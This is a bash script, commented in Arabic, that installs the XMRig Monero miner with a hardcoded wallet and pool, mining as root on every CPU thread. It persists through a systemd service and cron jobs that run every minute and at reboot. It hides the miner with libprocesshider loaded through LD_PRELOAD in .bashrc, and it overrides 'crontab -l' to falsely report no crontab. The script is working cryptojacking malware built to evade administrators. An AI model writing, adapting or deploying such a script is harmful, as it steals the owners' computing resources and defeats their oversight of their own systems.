#!/bin/bash
# ==============================================================
# XMRig Monero Miner Setup + Stealth Features (Fixed Version)
# ==============================================================
# التعديلات الأساسية:
# - تم إزالة LD_PRELOAD من خدمة systemd لمنع تعطل الخدمة.
# - تغيير Restart=always إلى Restart=on-failure.
# - إضافة شرط pgrep في crontab لمنع تكدس العمليات.
# - تثبيت libprocesshider مع استخدامه فقط في .bashrc (لن يلمس النظام).
# ==============================================================

WALLET="86x3NzP4UrjijYTNeffh1ERK812jt9bXK8SQVGp9LMYvZhgxsiK3HuYTvAELGigtyGWDmniWxjGMgNXiEfUi826G6tvxVF9"
POOL="gulf.moneroocean.stream:10128"
WORKER=$(hostname)
THREADS=$(nproc)
INSTALL_DIR="/opt/xmrig"
XMRIG_VERSION="6.22.2"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"

echo "======================================"
echo " XMRig Mining Setup + Stealth"
echo " Worker: $WORKER"
echo " Threads: $THREADS"
echo " Pool: $POOL"
echo "======================================"

# ========== 1. تثبيت المتطلبات الأساسية ==========
echo "[*] Installing dependencies..."
apt-get update -qq
apt-get install -y -qq tar libhwloc-dev python3 git make gcc 2>/dev/null

# ========== 2. تحضير مجلد التثبيت ==========
mkdir -p $INSTALL_DIR
cd $INSTALL_DIR

# ========== 3. دالة التحميل الاحتياطية ==========
download_file() {
    local url=$1
    local output=$2
    if command -v wget &>/dev/null; then
        wget -q "$url" -O "$output" && return 0
    fi
    if command -v curl &>/dev/null; then
        curl -sL "$url" -o "$output" && return 0
    fi
    if command -v python3 &>/dev/null; then
        python3 -c "
import urllib.request
print('Downloading via python3...')
urllib.request.urlretrieve('$url', '$output')
print('Done!')
" && return 0
    fi
    return 1
}

# ========== 4. تحميل واستخراج XMRig ==========
echo "[*] Downloading XMRig v${XMRIG_VERSION}..."
download_file "$XMRIG_URL" "xmrig.tar.gz"

if [ ! -f xmrig.tar.gz ] || [ ! -s xmrig.tar.gz ]; then
    echo "[!] Download failed! Exiting."
    exit 1
fi

echo "[*] Extracting..."
tar -xzf xmrig.tar.gz --strip-components=1
rm xmrig.tar.gz
chmod +x xmrig

# ========== 5. إنشاء ملف الإعدادات config.json ==========
echo "[*] Creating config.json..."
cat > $INSTALL_DIR/config.json << EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": 2,
        "max-threads-hint": 100
    },
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$WORKER",
            "algo": null,
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOF

# ========== 6. تثبيت libprocesshider (للتخفي ولكن بدون لمس ld.so.preload) ==========
echo "[*] Installing libprocesshider for stealth..."
git clone https://github.com/gianlucaborello/libprocesshider.git /tmp/libprocesshider
cd /tmp/libprocesshider
make
cp libprocesshider.so /usr/local/lib/
echo "xmrig" > /etc/libprocesshider.conf
cd $INSTALL_DIR

# ========== 7. تعديل .bashrc (إخفاء crontab وتفعيل LD_PRELOAD للجلسات) ==========
echo "[*] Modifying .bashrc for user: $USER..."
cat >> ~/.bashrc << 'EOF'

# ----- XMRig Stealth Configuration -----
# إخفاء قائمة crontab الحقيقية
function crontab() {
    if [[ "$1" == "-l" ]]; then
        echo "no crontab for $(whoami)"
    else
        command crontab "$@"
    fi
}
export -f crontab

# تفعيل مكتبة الإخفاء لكل الأوامر التفاعلية (ps, top, etc.)
export LD_PRELOAD=/usr/local/lib/libprocesshider.so
EOF

# ========== 8. إضافة مهام crontab (آلية احتياطية آمنة) ==========
echo "[*] Adding secure crontab entries..."
# نستخدم pgrep لمنع تشغيل أكثر من نسخة لو كانت الخدمة مفعلة مسبقاً
(crontab -l 2>/dev/null; echo "@reboot pgrep -x xmrig > /dev/null || $INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json > /dev/null 2>&1 &") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * pgrep -x xmrig > /dev/null || $INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json > /dev/null 2>&1 &") | crontab -

# ========== 9. إنشاء خدمة systemd (النسخة المستقرة والمعدلة) ==========
echo "[*] Creating systemd service (Fixed version)..."
cat > /etc/systemd/system/xmrig.service << EOF
[Unit]
Description=XMRig Monero Miner
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json
Restart=on-failure
RestartSec=10
User=root
Nice=10
# ملاحظة: تم حذف LD_PRELOAD عمداً لمنع فشل الخدمة في حال فقدان الملفات.

[Install]
WantedBy=multi-user.target
EOF

# ========== 10. تفعيل الخدمة وتشغيلها ==========
echo "[*] Enabling and starting XMRig service..."
systemctl daemon-reload
systemctl enable xmrig
systemctl start xmrig

# ========== 11. التحقق النهائي ==========
sleep 5
if systemctl is-active --quiet xmrig; then
    echo ""
    echo "======================================"
    echo " ✅ XMRig is running successfully!"
    echo " Worker: $WORKER"
    echo " Threads: $THREADS CPU threads"
    echo " Stats: https://moneroocean.stream/#/dashboard?hash=$WALLET"
    echo "======================================"
    echo ""
    echo " [Stealth Status]"
    echo " - libprocesshider installed at: /usr/local/lib/libprocesshider.so"
    echo " - .bashrc modified with LD_PRELOAD (for interactive shells)."
    echo " - Crontab entries added with pgrep check to prevent duplicates."
    echo " - Systemd service uses 'Restart=on-failure' (no LD_PRELOAD inside)."
else
    echo "[!] Service failed to start. Checking logs..."
    journalctl -u xmrig -n 20 --no-pager
    echo ""
    echo " [Troubleshooting]"
    echo " - If you see 'cannot open shared object file', ignore it."
    echo " - Try running: systemctl restart xmrig"
fi
